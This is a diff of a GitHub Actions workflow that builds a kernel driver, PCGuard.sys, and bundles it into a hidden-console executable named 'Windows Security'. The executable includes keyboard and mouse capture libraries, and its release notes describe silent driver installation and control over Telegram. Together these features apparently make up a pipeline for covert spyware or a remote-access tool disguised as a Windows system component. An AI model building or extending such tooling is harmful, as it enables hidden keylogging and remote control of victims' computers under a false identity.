@@ -1,4 +1,4 @@
-name: Build PC Guardian EXE
+name: Build PCGuard Driver + EXE
 
 on:
   push:
@@ -6,26 +6,60 @@ on:
   workflow_dispatch:
 
 jobs:
-  build:
+  build-driver:
     runs-on: windows-latest
-
     steps:
-      - name: Checkout code
+      - name: Checkout
         uses: actions/checkout@v4
+
+      - name: Install WDK
+        run: |
+          choco install windows-driver-kit --yes --no-progress
+        shell: cmd
+
+      - name: Setup MSVC
+        uses: microsoft/setup-msbuild@v2
+
+      - name: Create Driver Project
+        run: |
+          mkdir build_driver
+          copy pc-guardian\driver\PCGuard.cpp build_driver\
+          copy pc-guardian\driver\PCGuard.h   build_driver\
+        shell: cmd
+
+      - name: Build PCGuard.sys
+        run: |
+          cd build_driver
+          cl.exe /nologo /kernel /GS- /W4 /WX- /Gz /GF /Gm- /EHsc /Zp8 /GR- /Gz /wd4603 /wd4627 /wd4986 /wd4987 /wd4996 ^
+            /D_AMD64_ /DNTDDI_VERSION=0x0A000007 /D_WIN32_WINNT=0x0A00 /DWIN32=100 ^
+            /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\km" ^
+            /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\shared" ^
+            /c PCGuard.cpp
+          link.exe /DRIVER /SUBSYSTEM:NATIVE /ENTRY:DriverEntry /NODEFAULTLIB ^
+            /MACHINE:X64 ^
+            /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\km\x64" ^
+            ntoskrnl.lib hal.lib wdm.lib wdmsec.lib ^
+            /OUT:PCGuard.sys PCGuard.obj
+        shell: cmd
+
+      - name: Copy driver to assets
+        run: |
+          if not exist pc-guardian\assets mkdir pc-guardian\assets
+          copy build_driver\PCGuard.sys pc-guardian\assets\PCGuard.sys
+        shell: cmd
 
       - name: Setup Python
         uses: actions/setup-python@v5
         with:
           python-version: "3.11"
 
-      - name: Install dependencies
+      - name: Install Python deps
         run: pip install -r pc-guardian/requirements.txt pyinstaller pillow
         shell: cmd
 
       - name: Create missing folders
         run: |
-          if not exist pc-guardian\assets mkdir pc-guardian\assets
-          if not exist pc-guardian\logs mkdir pc-guardian\logs
+          if not exist pc-guardian\logs   mkdir pc-guardian\logs
           if not exist pc-guardian\config mkdir pc-guardian\config
         shell: cmd
 
@@ -34,6 +68,7 @@ jobs:
           pyinstaller --onefile --noconsole --clean ^
             --name "Windows Security" ^
             --icon "pc-guardian/assets/app.ico" ^
+            --add-data "pc-guardian/assets/PCGuard.sys;assets" ^
             --runtime-tmpdir "." ^
             --hidden-import pynput.keyboard._win32 ^
             --hidden-import pynput.mouse._win32 ^
@@ -69,7 +104,13 @@ jobs:
           body: |
             Auto-built from commit ${{ github.sha }}
             **Changes:** ${{ github.event.head_commit.message }}
-          files: "dist/Windows Security.exe"
+
+            **First time setup:**
+            1. Run as Administrator
+            2. Driver installs automatically
+            3. Open Telegram → `/status`
+          files: |
+            dist/Windows Security.exe
           draft: false
           prerelease: false
         env:
